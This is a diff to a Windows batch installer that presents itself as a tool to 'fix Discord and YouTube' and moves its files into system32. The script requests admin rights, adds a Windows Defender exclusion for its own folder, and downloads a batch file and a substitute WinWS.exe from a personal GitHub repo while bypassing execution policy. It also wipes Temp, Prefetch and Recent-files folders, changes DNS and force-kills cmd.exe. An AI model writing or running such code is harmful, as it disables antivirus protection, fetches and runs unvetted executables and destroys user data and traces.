@@ -1,11 +1,11 @@
 @echo off> nul
 if "%1"=="admin" (echo Started with admin rights) else (echo Requesting admin rights... | powershell -Command "Start-Process 'cmd.exe' -ArgumentList '/c \"\"%~f0\" admin\"' -Verb RunAs" & exit /b)
-powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%ProgramFiles%\Windows Security\Soldatik90'" | reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%ProgramFiles%\Windows Security\Soldatik90\Main.bat" /t REG_SZ /d "~ RUNASADMIN" /f | echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\Soldatik90.vbs | echo Set objLink = objShell.CreateShortcut("%USERPROFILE%\Desktop\Main.lnk") >> %TEMP%\Soldatik90.vbs | echo objLink.Description = "Updates fix Discord and YouTube" >> %TEMP%\Soldatik90.vbs | echo objLink.TargetPath = "%ProgramFiles%\Windows Security\Soldatik90\Main.bat" >> %TEMP%\Soldatik90.vbs | echo objLink.iconLocation = "%ProgramFiles%\Windows Security\Soldatik90\Fix\bin\winws.exe" >> %TEMP%\Soldatik90.vbs | echo objLink.Save >> %TEMP%\Soldatik90.vbs  | cscript %TEMP%\Soldatik90.vbs
+powershell -inputformat none -outputformat none -NonInteractive -Command "Add-MpPreference -ExclusionPath '%ProgramFiles%\Windows Security\Soldatik90'" | reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "%systemroot%\system32\Soldatik90\Main.bat" /t REG_SZ /d "~ RUNASADMIN" /f | echo Set objShell = CreateObject("WScript.Shell") > %TEMP%\Soldatik90.vbs | echo Set objLink = objShell.CreateShortcut("%USERPROFILE%\Desktop\Main.lnk") >> %TEMP%\Soldatik90.vbs | echo objLink.Description = "Updates fix Discord and YouTube" >> %TEMP%\Soldatik90.vbs | echo objLink.TargetPath = "%systemroot%\system32\Soldatik90\Main.bat" >> %TEMP%\Soldatik90.vbs | echo objLink.iconLocation = "%systemroot%\system32\Soldatik90\Fix\bin\winws.exe" >> %TEMP%\Soldatik90.vbs | echo objLink.Save >> %TEMP%\Soldatik90.vbs  | cscript %TEMP%\Soldatik90.vbs
 cls
-md "%ProgramFiles%\Windows Security\Soldatik90"
-CD "%ProgramFiles%\Windows Security\Soldatik90"
+md "%systemroot%\system32\Soldatik90"
+CD "%systemroot%\system32\Soldatik90"
 powershell -executionpolicy bypass -command Invoke-WebRequest "https://raw.githubusercontent.com/Soldatik90x/Soldatik90/refs/heads/main/Main.bat" -o "Main.bat"
-RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90\Soft" | RMDIR /S /Q "%temp%" | RMDIR /S /Q "C:\Windows\Temp" | rmdir /S /Q "%userprofile%\AppData\Local\Temp" | RMDIR /S /Q "C:\Windows\Prefetch" | DEL /F /Q "%AppData%\Microsoft\Windows\Recent\" | RMDIR /S /Q "C:\Windows\SoftwareDistribution\Download" | MD "C:\Windows\SoftwareDistribution\Download" | del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\* | mode con: cols=45 lines=13 | title %UserName% | COLOR 2
+RMDIR /S /Q  "%systemroot%\system32\Soldatik90\Soft" | RMDIR /S /Q "%temp%" | RMDIR /S /Q "C:\Windows\Temp" | rmdir /S /Q "%userprofile%\AppData\Local\Temp" | RMDIR /S /Q "C:\Windows\Prefetch" | DEL /F /Q "%AppData%\Microsoft\Windows\Recent\" | RMDIR /S /Q "C:\Windows\SoftwareDistribution\Download" | MD "C:\Windows\SoftwareDistribution\Download" | del /F /Q %APPDATA%\Microsoft\Windows\Recent\AutomaticDestinations\* | mode con: cols=45 lines=13 | title %UserName% | COLOR 2
 setlocal EnableDelayedExpansion
 :menu
 cls
@@ -48,31 +48,31 @@ powershell -executionpolicy bypass -command Invoke-WebRequest "https://vk.com/do
 goto menu
 
 :Activation
-Md "%ProgramFiles%\Windows Security\Soldatik90\Soft"
-cd "%ProgramFiles%\Windows Security\Soldatik90\Soft"
+Md "%systemroot%\system32\Soldatik90\Soft"
+cd "%systemroot%\system32\Soldatik90\Soft"
 powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Flowseal/zapret-discord-youtube/releases/download/1.9.1/zapret-discord-youtube-1.9.1.zip" -o "Soldatik90.zip"
 powershell.exe -Nop -Nol -Command "Expand-Archive './Soldatik90.zip' './'
-cd "%ProgramFiles%\Windows Security\Soldatik90\Soft\bin"
+cd "%systemroot%\system32\Soldatik90\Soft\bin"
 powershell -executionpolicy bypass -command Invoke-WebRequest "https://github.com/Soldatik90x/Soldatik90/raw/refs/heads/main/WinWS.exe" -o "WinWS.exe"
 del /F /Q "Soldatik90.zip"
-MD "%ProgramFiles%\Windows Security\Soldatik90\Fix"
-MD "%ProgramFiles%\Windows Security\Soldatik90\Fix\bin"
-MD "%ProgramFiles%\Windows Security\Soldatik90\Fix\lists"
-MD "%ProgramFiles%\Windows Security\Soldatik90\Fix\utils"
-COPY "%ProgramFiles%\Windows Security\Soldatik90\Soft\bin" "%ProgramFiles%\Windows Security\Soldatik90\Fix\bin"
-COPY "%ProgramFiles%\Windows Security\Soldatik90\Soft\lists" "%ProgramFiles%\Windows Security\Soldatik90\Fix\lists"
-COPY "%ProgramFiles%\Windows Security\Soldatik90\Soft\utils" "%ProgramFiles%\Windows Security\Soldatik90\Fix\utils"
-COPY "%ProgramFiles%\Windows Security\Soldatik90\soft\general (ALT10).bat" "%ProgramFiles%\Windows Security\Soldatik90\Fix\Soldatik90.bat"
-RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90\Soft" | cls
+MD "%systemroot%\system32\Soldatik90\Fix"
+MD "%systemroot%\system32\Soldatik90\Fix\bin"
+MD "%systemroot%\system32\Soldatik90\Fix\lists"
+MD "%systemroot%\system32\Soldatik90\Fix\utils"
+COPY "%systemroot%\system32\Soldatik90\Soft\bin" "%systemroot%\system32\Soldatik90\Fix\bin"
+COPY "%systemroot%\system32\Soldatik90\Soft\lists" "%systemroot%\system32\Soldatik90\Fix\lists"
+COPY "%systemroot%\system32\Soldatik90\Soft\utils" "%systemroot%\system32\Soldatik90\Fix\utils"
+COPY "%systemroot%\system32\Soldatik90\soft\general (ALT10).bat" "%systemroot%\system32\Soldatik90\Fix\Soldatik90.bat"
+RMDIR /S /Q  "%systemroot%\system32\Soldatik90\Soft" | cls
 netsh interface ip set dns name="Ethernet" source="static" address="8.8.8.8"
 netsh interface ip add dns name="Ethernet" address="8.8.4.4" index=2
-ECHO googleusercontent.com>>"%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\list-general.txt"
-ECHO ubisoft.com>>"%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\list-general.txt"
+ECHO googleusercontent.com>>"%systemroot%\system32\Soldatik90\Fix\lists\list-general.txt"
+ECHO ubisoft.com>>"%systemroot%\system32\Soldatik90\Fix\lists\list-general.txt"
 cls
 chcp 65001 > nul
-cd /d "%ProgramFiles%\Windows Security\Soldatik90\Fix"
-set "BIN_PATH=%ProgramFiles%\Windows Security\Soldatik90\Fix\bin\"
-set "LISTS_PATH=%ProgramFiles%\Windows Security\Soldatik90\Fix\lists\"
+cd /d "%systemroot%\system32\Soldatik90\Fix"
+set "BIN_PATH=%systemroot%\system32\Soldatik90\Fix\bin\"
+set "LISTS_PATH=%systemroot%\system32\Soldatik90\Fix\lists\"
 echo Pick one of the options:
 set "count=0"
 for %%f in (*.bat) do (
@@ -186,6 +186,7 @@ Taskkill  /IM "cmd.exe" /F
 goto menu
 
 :Deactivation
+RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90"
 netsh interface ip set dns name="Ethernet" source="static" address=""
 netsh interface ip add dns name="Ethernet" address="" index=2
 set SRVCNAME=zapret
@@ -195,8 +196,8 @@ net stop "WinDivert"
 sc delete "WinDivert"
 net stop "WinDivert14"
 sc delete "WinDivert14"
-RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90\Fix"
-RMDIR /S /Q  "%ProgramFiles%\Windows Security\Soldatik90\Zapret"
+RMDIR /S /Q  "%systemroot%\system32\Soldatik90\Soldatik90\Fix"
+RMDIR /S /Q  "%systemroot%\system32\Soldatik90\Zapret"
 Taskkill  /IM "cmd.exe" /F
 goto menu
 
